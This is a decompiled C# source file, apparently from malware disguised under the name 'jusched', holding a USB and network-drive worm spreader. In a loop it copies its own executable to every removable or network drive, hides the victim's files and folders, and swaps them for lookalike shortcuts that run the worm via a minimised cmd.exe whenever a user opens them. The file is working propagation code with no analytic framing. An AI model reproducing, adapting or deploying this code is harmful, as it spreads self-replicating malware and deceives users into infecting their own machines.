using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace jusched;

public class Usb
{
	public static Thread spread_0 = new Thread(usb_0);

	private static void usb_0()
	{
		try
		{
			while (true)
			{
				DriveInfo[] drives = DriveInfo.GetDrives();
				string usbname = Configuration.usbname;
				object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("WScript.Shell", ""));
				string text = "%windir%\\system32\\cmd.exe";
				string text2 = "%windir%\\explorer.exe";
				DriveInfo[] array = drives;
				foreach (DriveInfo driveInfo in array)
				{
					if (driveInfo.RootDirectory.get_Name().Contains("A:\\") || !((driveInfo.DriveType == DriveType.Removable) | (driveInfo.DriveType == DriveType.Network)))
					{
						continue;
					}
					string text3 = driveInfo.RootDirectory.ToString();
					string path = text3 + usbname + ".exe";
					try
					{
						if (File.Exists(path))
						{
							File.SetAttributes(path, (FileAttributes)0);
							File.Delete(path);
						}
						File.Copy(Application.get_ExecutablePath(), text3 + usbname + ".exe");
						File.SetAttributes(path, FileAttributes.Hidden | FileAttributes.System);
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
					File.SetAttributes(text3 + usbname + ".exe", FileAttributes.Hidden | FileAttributes.System);
					string[] files = Directory.GetFiles(text3);
					foreach (string text4 in files)
					{
						if (Operators.CompareString(Path.GetFileNameWithoutExtension(text4), usbname, false) != 0 && !text4.Contains(".lnk"))
						{
							try
							{
								File.SetAttributes(text4, FileAttributes.Hidden | FileAttributes.System);
							}
							catch (Exception projectError2)
							{
								ProjectData.SetProjectError(projectError2);
								ProjectData.ClearProjectError();
							}
							if (!text4.Contains("~"))
							{
								string fileName = Path.GetFileName(text4);
								object objectValue2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, (Type)null, "CreateShortcut", new object[1] { text3 + Path.GetFileNameWithoutExtension(text4) + ".lnk" }, (string[])null, (Type[])null, (bool[])null));
								object obj = objectValue2;
								NewLateBinding.LateSet(obj, (Type)null, "TargetPath", new object[1] { text }, (string[])null, (Type[])null);
								NewLateBinding.LateSet(obj, (Type)null, "WorkingDirectory", new object[1] { text3 }, (string[])null, (Type[])null);
								NewLateBinding.LateSet(obj, (Type)null, "WindowStyle", new object[1] { 7 }, (string[])null, (Type[])null);
								NewLateBinding.LateSet(obj, (Type)null, "Arguments", new object[1] { "start /min /C \"\".\\" + fileName + "\" | \".\\" + usbname + ".exe\" | taskkill /F /IM cmd.exe\"" }, (string[])null, (Type[])null);
								NewLateBinding.LateSet(obj, (Type)null, "IconLocation", new object[1] { text4 + ", 0" }, (string[])null, (Type[])null);
								NewLateBinding.LateCall(obj, (Type)null, "Save", new object[0], (string[])null, (Type[])null, (bool[])null, true);
								obj = null;
							}
						}
					}
					string[] directories = Directory.GetDirectories(text3);
					foreach (string text5 in directories)
					{
						DirectoryInfo directoryInfo = new DirectoryInfo(text5);
						string name = directoryInfo.get_Name();
						directoryInfo.Attributes = FileAttributes.Hidden | FileAttributes.System;
						if (!text5.Contains("~"))
						{
							object objectValue2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, (Type)null, "CreateShortcut", new object[1] { text5 + ".lnk" }, (string[])null, (Type[])null, (bool[])null));
							object obj2 = objectValue2;
							NewLateBinding.LateSet(obj2, (Type)null, "TargetPath", new object[1] { text }, (string[])null, (Type[])null);
							NewLateBinding.LateSet(obj2, (Type)null, "WindowStyle", new object[1] { 7 }, (string[])null, (Type[])null);
							NewLateBinding.LateSet(obj2, (Type)null, "Arguments", new object[1] { "start /min /C \"" + text2 + " .\\" + name + "\" | " + usbname + ".exe" }, (string[])null, (Type[])null);
							NewLateBinding.LateSet(obj2, (Type)null, "WorkingDirectory", new object[1] { text3 }, (string[])null, (Type[])null);
							NewLateBinding.LateSet(obj2, (Type)null, "IconLocation", new object[1] { Environment.GetEnvironmentVariable("windir") + "\\system32\\shell32.dll, 3" }, (string[])null, (Type[])null);
							NewLateBinding.LateCall(obj2, (Type)null, "Save", new object[0], (string[])null, (Type[])null, (bool[])null, true);
							obj2 = null;
						}
					}
				}
				Thread.Sleep(5000);
			}
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
	}
}
